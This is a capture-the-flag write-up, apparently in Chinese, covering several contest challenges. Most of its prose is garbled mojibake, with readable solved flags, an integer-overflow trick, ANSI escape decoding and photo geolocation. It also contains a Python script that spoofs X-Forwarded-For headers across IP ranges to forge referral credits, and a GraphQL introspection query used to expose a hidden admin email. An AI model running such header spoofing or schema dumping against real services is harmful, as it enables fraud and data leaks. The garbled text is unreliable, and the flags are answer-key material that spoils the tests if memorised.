å‡ºå»çš„å‰ä¸¤å¤©ï¼Œå°±å·²é¢„çŸ¥æ­¤äº‹å¹¶å°†å›¾ç‰‡ä¸­çš„ flag æ— å£°æ¶ˆæ³¯äº†ã€‚ åªæ˜¯ï¼Œè¿™ä½ X åŒå­¦ï¼Œè™½ç„¶ä¸ä¼šé€€å‡º Vimï¼Œä½†æ˜¯ä¼¼ä¹å¯¹æ‰“å¼€åå…­è¿›åˆ¶ç¼–è¾‘å™¨é¢‡æœ‰é€ è¯£â€¦â€¦ ç›´æ¥ OCR å¤§æ³•ï¼Œç„¶å hex è½¬ ASCII å®Œäº‹ã€‚ flag{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT} å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢ ï¼ˆå‰æƒ…æè¦ï¼‰ ä¸ºäº†æ‰“ç ´ Z åŒå­¦å¸ƒä¸‹çš„ç»“ç•Œï¼ŒX åŒå­¦å·å·æ¬å‡ºç¤¾å›¢çš„ä¸šä½™æ— çº¿ç”µå°è¯•å›¾å‘å¤–ç•Œé€šè®¯ã€‚ å½“ç„¶ï¼Œå¦‚æœåªæ˜¯è¿™æ ·è¿˜è¿œè¿œä¸å¤Ÿã€‚éµä¾å²ç§°â€œè€çˆ¹â€çš„ä¸Šå¤å…ˆè´¤çš„è‡³ç†åè¨€ï¼Œå¿…é¡»è¦â€œç”¨é­”æ³•æ‰“è´¥é­”æ³•â€ã€‚X åŒå­¦å‘ä¸Šçº§ç”³è¯·åˆ°äº†ç§‘å¤§è¥¿åŒºåŒæ­¥è¾å°„å®éªŒå®¤è®¾å¤‡çš„ä½¿ç”¨æƒé™ï¼Œä»¥æ­¤æ‰“é€šæ¬¡å…ƒç©ºé—´ï¼Œå€ŸåŠ©åˆ°å¦ä¸€ä¸ªå¹³è¡Œå®‡å®™ä¸­ Z åŒå­¦çš„æ³•åŠ›è¿›è¡Œæ•°æ®å¯¹å†²ï¼Œæ–¹æ‰äºä¹±ä¸­æå¾—ä¸€ä¸æœºä¼šï¼Œå°† flag ç”¨æ— çº¿ç”µçš„å½¢å¼å‘å°„äº†å‡ºå»ã€‚ è€ƒè™‘åˆ°ä¿¡æ¯çš„é²æ£’æ€§ï¼ŒX åŒå­¦ä½¿ç”¨äº†æ— çº¿ç”µä¸­æƒ¯ç”¨çš„æ–¹æ³•æ¥åŒºåˆ†å­—ç¬¦ä¸²ä¸­è¯»éŸ³ç›¸è¿‘çš„å­—æ¯ã€‚å³ä½¿å¦‚æ­¤ï¼Œæ‰“ç ´æ¬¡å…ƒçš„å¼ºå¤§èƒ½é‡æ‰­æ›²äº†æ—¶ç©ºï¼Œä½¿å¾—æœ€ç»ˆæ¥å—åˆ°çš„å½•éŸ³çš„é€Ÿåº¦æœ‰æ‰€æ”¹å˜ã€‚ ä¸ºäº†ä¿éšœåŒæ­¥è¾å°„è®¾å¤‡çš„æŒç»­è¿è½¬ï¼Œç»„ç»‡ç‰ºç‰²äº†å¤§é‡çš„èƒ½æºï¼Œç”šè‡³ä»¥ä¸œåŒ—éƒ¨åˆ†åœ°åŒºæ— è®¡åˆ’é™ç”µä¸ºä»£ä»·ï¼ŒæŠŠè¿™ä»½æ²‰ç”¸ç”¸çš„å½•éŸ³æ–‡ä»¶é€åˆ°äº†ä½ çš„æ‰‹ä¸Šã€‚è€Œåˆšåˆšèµ·åºŠæ²¡å¤šä¹…ï¼Œè¯•å›¾æŠ¢ç­¾åˆ°é¢˜ä¸€è¡€è¿˜å¤±è´¥äº†çš„ä½ ï¼Œå¯ä»¥ä¸è¾œè´ŸåŒå­¦ä»¬å¯¹ä½ çš„æ®·åˆ‡æœŸæœ›å—ï¼Ÿ æ³¨ï¼šflag èŠ±æ‹¬å·å†…åªåŒ…å«å°å†™å­—æ¯ã€‚ å…ˆæ”¾æ…¢ä¸€ä¸¢ä¸¢ï¼Œç„¶åå¯¹ç…§ æ— çº¿ç”µä¸­çš„è‹±è¯­å­—æ¯è¯»æ³• å¯ä»¥å¾—åˆ°æ˜¯ flag{phoneticab} å–ç“œ æœ‰ä¸€ä¸ªäººå‰æ¥ä¹°ç“œã€‚ HQï¼šå“¥ä»¬ï¼Œè¿™ç“œå¤šå°‘é’±ä¸€æ–¤å•Šï¼Ÿ ä½ ï¼šä¸¤å—é’±ä¸€æ–¤ã€‚ HQï¼šWhatâ€™s upï¼è¿™ç“œçš®å­æ˜¯é‡‘å­åšçš„è¿˜æ˜¯ç“œç²’å­æ˜¯é‡‘å­åšçš„ï¼Ÿ ä½ ï¼šä½ ç§ç§ç°åœ¨å“ªæœ‰ç“œå•Šï¼Ÿè¿™éƒ½æ˜¯å¤§æ£šçš„ç“œï¼Œåªæœ‰ 6 æ–¤ä¸€ä¸ªå’Œ 9 æ–¤ä¸€ä¸ªçš„ï¼Œä½ å«Œè´µæˆ‘è¿˜å«Œè´µå‘¢ã€‚ ï¼ˆHQ å¿ƒé‡Œé»˜é»˜ä¸€ç®—ï¼‰ HQï¼šç»™æˆ‘æ¥ 20 æ–¤çš„ç“œã€‚ ä½ ï¼šè¡Œï¼ HQï¼šè¡Œï¼Ÿè¿™ç“œèƒ½ç§°å‡º 20 æ–¤å—ï¼Ÿ ä½ ï¼šæˆ‘å¼€æ°´æœæ‘Šçš„ï¼Œè¿˜ä¸ä¼šç§°é‡ï¼Ÿ HQï¼šæˆ‘é—®ä½ è¿™ç“œèƒ½ç§°å‡º 20 æ–¤å—ï¼Ÿ ä½ ï¼šä½ æ˜¯æ•…æ„æ‰¾èŒ¬ï¼Œæ˜¯ä¸æ˜¯ï¼Ÿä½ è¦ä¸è¦å§ï¼ HQï¼šä½ è¿™ç“œè¦æ˜¯åˆšå¥½ 20 æ–¤å—æˆ‘è‚¯å®šè¦å•Šã€‚é‚£å®ƒè¦æ˜¯æ²¡æœ‰æ€ä¹ˆåŠå•Šï¼Ÿ ä½ ï¼šè¦æ˜¯ä¸æ˜¯ 20 æ–¤ï¼Œæˆ‘è‡ªå·±åƒäº†å®ƒï¼Œæ»¡æ„äº†å§ï¼Ÿ ï¼ˆä½ å¼€å§‹é€‰ç“œç§°é‡ï¼‰ è¡¥å……è¯´æ˜ï¼šå½“ç§°çš„æ•°å­—å˜ä¸ºæµ®ç‚¹æ•°è€Œä¸æ˜¯æ•´æ•°æ—¶ï¼ŒHQ ä¸ä¼šè®¤å¯æœ€ç»ˆçš„ç§°é‡ç»“æœã€‚ http://202.38.93.111:15003/ è¿›è¡Œä¸€ä¸ªğŸ‰çš„å–ã€‚ ï¼ˆæµ‹è¯•å·¥ç¨‹å¸ˆèµ°è¿›äº†è¿™å®¶ç“œé“ºï¼Œï¼‰å°è¯•æ„é€ ä¸ªè´Ÿæ•° æ“ä½œæ— æ•ˆï¼šä¸èƒ½æ”¾è´Ÿæ•°ä¸ªç“œã€‚ 1.5ä¸ª6 æ–¤ -&gt; 6æ–¤ æ•´ä¸ªè¶…çº§å¤§çš„æ•°ï¼Œå¤šæ¥å‡ æ¬¡ï¼Œå—¯ï¼Œæº¢å‡ºå•¦ï¼ é‡æ–°å¼€å§‹ï¼Œå•ç‹¬æ”¾6æ–¤çš„ç“œ 18446744073709551615ï¼ˆ0xFFFFFFFFFFFFFFFFï¼Œ64ä½å…¨1ï¼‰ä¸ªï¼Œå¾—åˆ°0ä¸ªï¼› å•ç‹¬æ”¾9æ–¤è¿™ä¹ˆå¤šä¸ª -&gt; -9223372036854775808 æ–¤ï¼Œä¹Ÿå°±æ˜¯ -0x8000000000000000 ç„¶åä¸ç®¡äº†ï¼Œåæ­£å…ˆç”¨ä¸ªè´Ÿæ•°ï¼Œç„¶åå†åŠ å›å»åˆ°æ­£çš„20å°±å®Œäº‹äº†ï¼Œæ³¨æ„ä¸€ä¸‹è¦ x6 æˆ–è€… x9 è€Œä¸”ä¸è¦æº¢å‡ºã€‚ æ¯”å¦‚å…ˆæ”¾ 1537228672809129301ä¸ª 9æ–¤çš„ ç”µå­ç§¤ä¸Šå·²æœ‰ -4611686018427387904/20 æ–¤çš„ç“œã€‚ ç„¶åæ”¾ 4611686018427387904//6 == 768614336404564650 ä¸ª 6 æ–¤çš„ï¼Œå¾—åˆ° -4 æ–¤ã€‚ æœ€åå†æ”¾ 4 ä¸ª 6 æ–¤çš„å®Œäº‹ã€‚ çŒ«å’ªé—®ç­” Pro Max æˆ‘çŒ›ç„¶ä¸€çœ‹ï¼Œå°±çŒ›ç„¶çœ‹åˆ°è¿™ä¸ªçŒ«å’ªé—®ç­”ï¼Œæˆ‘ç›´å‘¼æˆ‘ç›´å‘¼ï¼Œä¸Šæ¬¡çœ‹åˆ°è¿™ä¹ˆè¿™ä¹ˆçš„å‘è¨€è¿˜æ˜¯ä¸Šæ¬¡ï¼Œè¿™é—®ç­”å±äºæ˜¯å…¸å‹çš„å…¸å‹äº†ï¼Œæˆ‘ä¹‹å‰è¿˜æ²¡å‘ç°ï¼Œå½“æˆ‘å‘ç°çš„æ—¶å€™æˆ‘å·²ç»å‘ç°äº†ï¼Œè¿™é—®ç­”å°±åƒä¸€ä¸ªé—®ç­”ï¼Œé—®ç­”çš„å†…å®¹å……æ»¡äº†å†…å®¹ï¼Œæˆ‘ä¸ç¦æ„Ÿæ…¨äº†ä¸€å¥æ„Ÿæ…¨ï¼šå¸Œæœ›ä¸‹æ¬¡çœ‹åˆ°è¿™ä¹ˆè¿™ä¹ˆçš„çŒ«å’ªé—®ç­”æ˜¯ä¸‹æ¬¡ã€‚ æç¤ºï¼šè§£å‡ºè°œé¢˜ä¸éœ€è¦æ˜¯ç§‘å¤§åœ¨æ ¡å­¦ç”Ÿã€‚è§£é¢˜é‡åˆ°å›°éš¾ï¼Ÿä½ å¯ä»¥å‚è€ƒ 2018 å¹´çŒ«å’ªé—®ç­”é¢˜è§£ å’Œ 2020 å¹´çŒ«å’ªé—®ç­”++ é¢˜è§£ã€‚ 20190928 http://ftp.lug.ustc.edu.cn/%E7%A4%BE%E5%9B%A2%E7%AE%A1%E7%90%86/%E7%AB%A0%E7%A8%8B/ https://lug.ustc.edu.cn/wiki/lug/events/ è¯•äº† 20201024 ä¹Ÿä¸å¯¹ï¼Œçœ‹è¿™ä¸ª slide é‡Œé¢è²Œä¼¼ä¹Ÿæœ‰æŠ•ç¥¨çš„ã€‚ï¼ˆ å†çœ‹é¢˜ç›®ï¼Œä»–é—®çš„æ˜¯ ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨çš„ç¤¾å›¢ç« ç¨‹ å•Šï¼Œé‚£åº”è¯¥æ˜¯2017å¹´ä¹‹å‰çš„äº†ã€‚ã€‚ é‚£æ—¢ç„¶ç»™äº†åŸŸåï¼Œç›´æ¥å» webarchive æ‰¾å§ã€‚ https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes 5 ä¸ºäº†è¡¨å½°å…¶å‡ºè‰²è¡¨ç°ï¼Œåä¼šäº 2011 å¹´ 5 æœˆè¢«è¯„ä¸ºä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ä¼˜ç§€å­¦ç”Ÿç¤¾å›¢ï¼Œäº 2012 å¹´ 5 æœˆã€2013 å¹´ 5 æœˆåŠ 2014 å¹´ 5 æœˆåˆ†åˆ«è¢«è¯„ä¸ºä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å››æ˜Ÿçº§å­¦ç”Ÿç¤¾å›¢ï¼Œå¹¶äº 2015 å¹´ 5 æœˆã€2017 å¹´ 7 æœˆã€2018 å¹´ 9 æœˆã€2019 å¹´ 8 æœˆåŠ 2020 å¹´ 9 æœˆè¢«è¯„ä¸ºä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦äº”æ˜Ÿçº§å­¦ç”Ÿç¤¾å›¢ã€‚ via https://lug.ustc.edu.cn/wiki/intro/ ç„¶è€Œå‘ç°è¯•äº†4ä¸å¯¹ï¼Œçœ‹æ¥ä»Šå¹´ä¹Ÿæœ‰å§ ï¼ˆä¸åŠæ—¶æ›´æ–°å®³äººä¸æµ…å•Š è¿™ä¸ªè¿˜æ˜¯æœ‰ç‚¹éš¾æ‰¾çš„ï¼Œå…¶å®å§ï¼Œå–µå–µå…ˆæ˜¯ç¿» tg æ‰¾åˆ°äº†è¿™å¼ å›¾ï¼ˆè·‘ ç„¶åå’•å’•å™œæœåˆ°å•¦ï¼ˆ Development Team of Library 13 å¯ä»¥æ‰¾åˆ°è¿™ç¯‡è®ºæ–‡ http://sigbovik.org/2021/ http://sigbovik.org/2021/proceedings.pdf ç„¶ååé¢ä»–ä¸¾äº†13ä¸ªæ•°æ®é›†çš„ä¾‹å­ï¼Œ13å¼ å›¾â€¦â€¦ /dev/null https://datatracker.ietf.org/doc/rfc8962/ å®Œäº‹ï¼ˆ é€æ˜çš„æ–‡ä»¶ ä¸€ä¸ªé€æ˜çš„æ–‡ä»¶ï¼Œç”¨äºåœ¨ç»ˆç«¯ä¸­å±•ç¤ºä¸€ä¸ªäº”é¢œå…­è‰²çš„ flagã€‚ å¯èƒ½æ˜¯åœ¨ cmd.exe ç­‰åŠ£è´¨ç»ˆç«¯ä¸­è¢«é•¿æœŸä½¿ç”¨çš„åŸå› ï¼Œè¿™ä¸ªæ–‡ä»¶å¤±å»äº†ä¸€äº›é‡è¦æˆåˆ†ï¼Œå˜æˆäº†ä¸€å †ä¹±ç ï¼Œä¹Ÿä¸ä¼šå†æ˜¾ç¤ºå‡º flag äº†ã€‚ æ³¨æ„ï¼šflag å†…éƒ¨çš„å­—ç¬¦å…¨éƒ¨ä¸ºå°å†™å­—æ¯ã€‚ ç»™çš„æ–‡ä»¶å¤§æ¦‚é•¿è¿™æ ·â€¦â€¦ [0;0H[20;58H[8;34H[13;27H[4;2H[38;2;1;204;177m [39m[14;10H[20;51H[23;4H[12;2H[38;2;2;207;173m [39m[19;61H[9;12H[22;8H[20;2H[38;2;3;210;169m [39m[3;23H[8;68H[19;10H[4;3H[38;2;4;214;165m [39m[19;23H[17;34H[11;52H[22;70H[12;3H[38;2;5;217;161m [39m[24;22H[2;25H[19;76H[19;3H[38;2;6;220;157m [39m[23;14H[21;12H[10;37H[2;37H[22;66H[16;45H[21;3H[38;2;7;222;153m å¾ˆæ˜æ˜¾æ˜¯ shell çš„è½¬ä¹‰åºåˆ—ï¼Œç„¶å åƒåœ¾ cmd æ˜¾ç¤ºä¸å‡ºæ¥é”…äº†ã€‚ å‚è€ƒ Bash tips: Colors and formatting (ANSI/VT100 Control sequences) æˆ–è€…çœ‹ TaQini å¸ˆå‚…çš„ è®¾ç½®ç»ˆç«¯è¾“å‡ºå­—ç¬¦çš„å±æ€§ï¼ˆé¢œè‰²+æ ¼å¼+è¶…é“¾æ¥ï¼‰ å¯ä»¥çŸ¥é“ \\033[y;xH ç”¨æ¥è®¾ç½®å…‰æ ‡ä½ç½®ï¼Œé‚£å…¶å®å°±ç›¸å½“äºé¼ æ ‡ç”»å›¾äº†ï¼ˆè€è€ƒç‚¹äº† é‚£å°±ä¾æ¬¡æå–å‡ºå„ä¸ªç‚¹ï¼Œç”»ä¸ªå›¾è¿ä¸€èµ·å°±å¥½äº†ã€‚ ç”»å‡ºæ¥å‘ç°è¿™æ˜¯å•¥å•Šâ€¦â€¦ å…¶å®åªæœ‰æ¯ä¸€è¡Œï¼ˆå³åŸå§‹æ•°æ®çš„ç©ºæ ¼ä¹‹å‰ï¼‰çš„æœ€åä¸€ä¸ªåæ ‡æœ‰ç”¨å•¦ã€‚ ç„¶åæ‘¸äº†ï¼Œç›´æ¥æ›¿æ¢æ–‡ä»¶æŠŠæœ€åçš„é¢œè‰²è¾“å‡ºä¸ªå­—ç¬¦å‡ºæ¥ç®—äº†ï¼ˆè·‘ å…ˆåŠ ä¸ª ESC çš„è½¬ä¹‰å­—ç¬¦ \\033ï¼Œç„¶åæœ€åéšä¾¿åŠ ä¸ªå­—ç¬¦ã€‚ ï¼ˆå½“ç„¶ä½ ç”¨ sed ä¹Ÿè¡Œ echo -e `cat transparent_fix.txt` å…¨å°å†™å­—æ¯ flag{abxnniohkalmcowsayfiglet} æ—…è¡Œç…§ç‰‡ ä½ çš„å­¦é•¿å†³å®šæ¥ä¸€åœºè¯´èµ°å°±èµ°çš„æ—…è¡Œã€‚é€šè¿‡ä»–å‘ç»™ä½ çš„ç…§ç‰‡æ¥çœ‹ï¼Œä»–åº”è¯¥æ˜¯åœ¨é…’åº—ä½ä¸‹äº†ã€‚ ä»ç…§ç‰‡æ¥çœ‹ï¼Œé…’åº—ä¼¼ä¹åœ¨å°åŒºçš„ä¸€æ ‹é«˜æ¥¼é‡Œï¼Œé™„è¿‘è¿˜æœ‰ä¸€å®¶ KFC åˆ†åº—ã€‚çªç„¶ï¼Œä½ æ„è¯†åˆ°ç…§ç‰‡é‡Œé€éœ²å‡ºæ¥çš„ä¿¡æ¯æ¯”è¡¨é¢ä¸Šçœ‹èµ·æ¥çš„è¦å¤šã€‚ è¯·è§‚å¯Ÿç…§ç‰‡å¹¶ç­”å¯¹å…¨éƒ¨ 5 é“é¢˜ä»¥è·å– flagã€‚æ³¨æ„ï¼šå›¾ç‰‡æœªåœ¨å…¶ä»–åœ°æ–¹å…¬å¼€å‘å¸ƒè¿‡ï¼Œä¹Ÿæœªé‡‡å–ä»»ä½•éšå†™æªæ–½ï¼ˆé€šè¿‡æ‰‹æœºæ‹æ‘„å±å¹•äº¦å¯ç­”é¢˜ï¼‰ã€‚ æ˜¯å›¾ç‰‡ç¤¾å·¥å¤§æ‰‹å­å•Šï¼ˆæ€ä¹ˆä½ ä»¬éƒ½ä¼šåšå•Š å¾ˆæ˜æ˜¾è¿™ä¸ªæ˜¯åœ¨æµ·è¾¹ï¼Œçœ‹èµ·æ¥æ˜¯é¢æœåå—æ–¹å‘ï¼Œé˜³å…‰ä»å³å¾€å·¦ç…§ï¼Œé‚£åº”è¯¥æ˜¯ä»è¥¿è¾¹ç…§è¿‡æ¥ã€‚å½“å‰å°±æ˜¯å‚æ™šäº†ã€‚ è¿™ä¸ªè‚¯å¾·åŸºè“è‰²çš„å¾ˆæœ‰ç‰¹å¾ï¼Œå’•å’•å™œä¸€æœï¼Œæ‰¾åˆ°äº†å°çº¢ä¹¦çš„ä¸€ä¸ªç¬”è®°ï¼Œå•Šï¼Œä¸å°±æ˜¯è¿™ä¸ªå˜›ã€‚ ç§¦çš‡å²›æ–°å¥¥æµ·åœ°ä¸–ç•Œï¼Œå¾ˆå¥½ã€‚ ç™¾åº¦åœ°å›¾ æœä¸€æ³¢ï¼Œå°±ä½ äº†ã€‚æ‹æ‘„çš„è§’åº¦å¦‚å›¾æ‰€ç¤ºã€‚ è‚¯å¾·åŸºå·ç  0335-7168800 ç™¾åº¦è¿™ä¸ªå®æ™¯åœ°å›¾è¿˜æ˜¯è€çš„å•Šï¼Œä¸è¿‡ä¹Ÿèƒ½çœ‹å‡ºæ˜¯ æµ·è±šé¦† äº†ã€‚ æ¥¼å±‚çš„è¯ï¼Œæ ¹æ®å¯¹é¢çš„æ¥¼ï¼Œè¿™ä¸ªæ‹çš„ä¸è¶…è¿‡15æ¥¼ï¼Œå†è€ƒè™‘åˆ°æ‹æ‘„è§’åº¦åä¸‹ï¼Œä¿¯æ‹çš„æ„Ÿè§‰ï¼Œåº”è¯¥ä¹Ÿåœ¨è¿™ä¸ªé™„è¿‘äº†ã€‚æœ€åè¯•äº†å‘ç°å°±æ˜¯14Fã€‚ å®Œäº‹ã€‚ æœ‰æ„æ€çš„æ˜¯ï¼Œé¢˜ç›®çš„ç­”æ¡ˆæ˜¯é€šè¿‡å°†é€‰é¡¹å†…å®¹åºåˆ—åŒ–ä¹‹åè¯·æ±‚åç«¯çš„ä¸€ä¸ªæ–‡ä»¶æ¥å¾—åˆ°çš„ã€‚ http://202.38.93.111:10055/MT1iJjI9ZSYzPTE0JjQ9MDMzNS03MTY4ODAwJjU9JUU2JUI1JUI3JUU4JUIxJTlBJUU5JUE2JTg2.txt FLAG åŠ©åŠ›å¤§çº¢åŒ… â€œå¬è¯´æ²¡ï¼Ÿã€å¤§ç åˆ€ã€‘å¹³å°åˆåŒå’åšæ´»åŠ¨å•¦ï¼å‚ä¸æ´»åŠ¨å°±é€ 0.5 ä¸ª flag å‘¢ï¼Œæ”’æ»¡ 1 ä¸ª flag å³å¯å…è´¹æå–ï¼â€ â€œè¿˜æœ‰è¿™ä¹ˆå¥½çš„äº‹æƒ…ï¼Ÿæˆ‘ä¹Ÿè¦å‚åŠ ï¼â€ â€œå¿«ç‚¹å§ï¼æˆ‘å·²ç»æ‹¿åˆ° flag äº†å‘¢ï¼å†ä¸å‚åŠ  flag å°±è¦å‘å®Œäº†å‘¢ã€‚â€ â€œé‚£æ€ä¹ˆæ‰èƒ½å‚åŠ å‘¢ï¼Ÿâ€ â€œè¿™è¿˜ä¸ç®€å•ï¼ç‚¹å‡»ä¸‹é¢çš„é“¾æ¥å°±è¡Œâ€ å…¬å‘Šï¼šæœ¬é¢˜åœ¨å°æ¦‚ç‡æƒ…å†µä¸‹ä¼šäº§ç”Ÿæ“ä½œæ—¶é—´é™åˆ¶æ— æ³•é‡ç½®çš„ç°è±¡ï¼Œè¡¨ç°ä¸ºä¸€ç›´æ˜¾ç¤ºâ€œæ“ä½œé€Ÿåº¦å¤ªå¿«äº†ï¼Œè¯·ç¨åå†è¯•ï¼â€ï¼Œç°å·²ä¿®å¤ï¼Œè¯·å¤§å®¶é‡æ–°ç‚¹å‡»æŒ‰é’®åç¨ç­‰å‡ ç§’é’Ÿå³å¯æ¢å¤ã€‚ å•Šï¼Œæ˜¯æ‹¼å¤•å¤• åˆæ˜¯å¯æ¶çš„ç ä»·ï¼å™¢ä¸å¯¹ï¼Œæ˜¯é›† flagï¼ å‰ç«¯ä¼šè°ƒç”¨ https://pv.sohu.com/cityjson?ie=utf-8 è¿™ä¸ªæ¥å£è·å–IPï¼Œåç«¯æ¯”å¯¹æ˜¯å¦ç›¸ç¬¦ï¼Œå¦‚æœç›¸ç¬¦åˆ™å¯åŠ©åŠ›æˆåŠŸã€‚ ç„¶åå‘ç°å’±æ ¡ IP å‡ºå£åˆ†æµç­–ç•¥ä¸ä¸€æ ·ï¼Œå¯¼è‡´å‰åç«¯ç»“æœä¸ä¸€è‡´ï¼ˆ ä¸è¿‡å‘ç°ç›´æ¥åŠ ä¸ª X-Forwarded-For å¤´å°±å¥½äº†ã€‚ æ¥ä¸‹æ¥å°±æ˜¯éå† /8 æ®µï¼Œä¾æ¬¡å‘åŒ…å°±å®Œäº‹äº†ã€‚ import time import requests url = \"http://202.38.93.111:10888/invite/a7009a3c-6bd0-4674-8586-e36a9b4b7e58\" for i in range(256): ip = f'{i}.1.1.1' data = \"ip=\" + ip headers = { \"X-Forwarded-For\": ip, \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\", \"Content-Type\": \"application/x-www-form-urlencoded\" } r = requests.post(url, headers=headers, data=data) # print(r.status_code) # print(r.text) if \"åŠ©åŠ›æˆåŠŸ\" in r.text: print(i, 'OK') time.sleep(1.25) æ³¨æ„ä¸èƒ½å¤ªå¿«ï¼Œä¸ç„¶ä¼šæ— æ•ˆã€‚ ç­‰åˆ°è·‘å®Œå°±èƒ½æç°äº†ã€‚ flag{r3d-enve10p3-bf6a7f44ac} ï¼ˆè¦æ˜¯æ‹¼å¤•å¤•ä¹Ÿèƒ½è¿™ä¹ˆåˆ·å°±å¥½äº† Amnesia ä½ çš„ç¨‹åºåªéœ€è¦è¾“å‡ºå­—ç¬¦ä¸² Hello, world!ï¼ˆç»“å°¾æœ‰æ— æ¢è¡Œå‡å¯ï¼‰å¹¶æ­£å¸¸ç»“æŸã€‚ ç¼–è¯‘æŒ‡ä»¤ï¼šgcc -O file.c -m32 è¿è¡ŒæŒ‡ä»¤ï¼š./a.out ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼šDocker é•œåƒ ustclug/debian:10 ä¸­ apt update &amp;&amp; apt -y upgrade &amp;&amp; apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 çš„ç‰ˆæœ¬ è½»åº¦å¤±å¿† ç¼–è¯‘å ELF æ–‡ä»¶çš„ .data å’Œ .rodata æ®µä¼šè¢«æ¸…é›¶ã€‚ è¿æ¥é¢˜ç›®ï¼šnc 202.38.93.111 10051 æˆ–ç½‘é¡µç»ˆç«¯ åˆ¤é¢˜è„šæœ¬ï¼šä¸‹è½½ è®°å¿†æ¸…é™¤ ç¼–è¯‘å ELF æ–‡ä»¶çš„ .text æ®µä¼šè¢«æ¸…é›¶ã€‚ è¿æ¥é¢˜ç›®ï¼šnc 202.38.93.111 10061 æˆ–ç½‘é¡µç»ˆç«¯ åˆ¤é¢˜è„šæœ¬ï¼šä¸‹è½½ è½»åº¦å¤±å¿† linux ç›®æ ‡æ–‡ä»¶(*.o) bss,data,text,rodata,å †,æ ˆ æ•°æ®æ®µï¼ˆBSSæ®µã€DATAæ®µï¼‰ã€ä»£ç æ®µï¼ˆ.RODATAï¼‰ã€å †æ ˆæ®µçš„åŒºåˆ« volatileå…³é”®å­—é€šå¸¸ç”¨æ¥ä¿®é¥°å¤šçº¿ç¨‹å…±äº«çš„å…¨å±€å˜é‡å’ŒIOå†…å­˜ã€‚å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä¸è¦æŠŠæ­¤ç±»å˜é‡ä¼˜åŒ–åˆ°å¯„å­˜å™¨ä¸­ï¼Œæ¯æ¬¡éƒ½è¦è€è€å®å®çš„ä»å†…å­˜ä¸­è¯»å–ï¼Œå› ä¸ºå®ƒä»¬éšæ—¶éƒ½å¯èƒ½å˜åŒ–ã€‚è¿™ä¸ªå…³é”®å­—å¯èƒ½æ¯”è¾ƒç”Ÿåƒ»ï¼Œä½†åƒä¸‡ä¸è¦å¿˜äº†å®ƒï¼Œå¦åˆ™ä¸€ä¸ªé”™è¯¯è®©ä½ è°ƒè¯•å¥½å‡ å¤©ä¹Ÿå¾—ä¸åˆ°ä¸€ç‚¹çº¿ç´¢ã€‚ ï¼ˆæ³¨ï¼šè¿™ä¸ªç›¸å½“äºstm32æ–‡ä»¶ä¸­å®šä¹‰çš„__IOï¼Œä»£è¡¨äº†æ¯æ¬¡è¯»å–ç”¨è¿™ä¸ªå…³é”®è¯å®šä¹‰çš„å€¼çš„æ—¶å€™ï¼Œéœ€è¦å»å†…å­˜ä¸­å®æ—¶çš„è¯»å–ã€‚ä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡å¾—åˆ°çš„éƒ½æ˜¯æœ€æ–°çš„å€¼ï¼‰ æ•´ä¸ª volatile è¯•è¯•å§ï¼ˆå¥½ä¹…æ²¡å†™Cäº†å•Š #include &lt;stdio.h&gt; int main() { volatile char *x = \"Hello, world!\"; puts(x); return 0; } è™½ç„¶ puts å‡½æ•°ä¸­å˜é‡å®šä¹‰çš„ç±»å‹æ˜¯ const char *ï¼Œä¼šæŠ¥ warningï¼Œä½†ä¸å½±å“æ­£å¸¸è¾“å‡ºå‘€ï¼ˆè·‘ è¦æ˜¯æ¢æˆç”¨æ•°ç»„ï¼Œä¸€ä¸ªä¸€ä¸ªå…ƒç´ èµ‹å€¼åº”è¯¥å°±ä¸ä¼šæœ‰è¿™ä¸ªé—®é¢˜ã€‚ å†æˆ–è€…ï¼Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦ putchar ä¹Ÿè¡Œã€‚ å›¾ä¹‹ä¸Šçš„ä¿¡æ¯ å° T å¬è¯´ GraphQL æ˜¯ä¸€ç§ç‰¹åˆ«çš„ API è®¾è®¡æ¨¡å¼ï¼Œä¹Ÿæ˜¯ RESTful API çš„æœ‰åŠ›ç«äº‰è€…ï¼Œæ‰€ä»¥ä»–å†™äº†ä¸ªå°ç½‘ç«™æ¥å®éªŒè¿™é¡¹æŠ€æœ¯ã€‚ ä½ èƒ½é€šè¿‡è¿™ä¸ªå…¨æ–°çš„æ¥å£ï¼Œè·å–åˆ°æ²¡æœ‰å…¬å¼€å‡ºæ¥çš„ç®¡ç†å‘˜çš„é‚®ç®±åœ°å€å—ï¼Ÿ u1s1 ç¬¬ä¸€æ¬¡ç”¨ GraphQLï¼Œè™½ç„¶æ—©å°±çŸ¥é“ GitHub æ–°ç‰ˆ APIï¼ˆå¥½åƒæ˜¯ v4ï¼Ÿï¼‰æ˜¯åŸºäºè¿™ä¸ªè¿›è¡ŒæŸ¥è¯¢çš„äº†ã€‚ è¿™é¢˜æ˜¯ä¸ªç¬”è®°é˜…è¯»ç³»ç»Ÿï¼Œguest ç™»å½•è¿›å»ï¼Œæœ‰ä¸ª /graphql æ¥å£è¯·æ±‚åç«¯ã€‚ å‚è€ƒ å½“CTFé‡ä¸ŠGraphQLçš„é‚£äº›äº‹ å…ˆ dump ä¸€ä¸‹æ‰€æœ‰å¯¹è±¡å’Œå­—æ®µï¼Œé€šè¿‡ IntrospectionQuery æ¥è¿”å›è¶³å¤Ÿå¤šä¿¡æ¯ã€‚ query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} or query 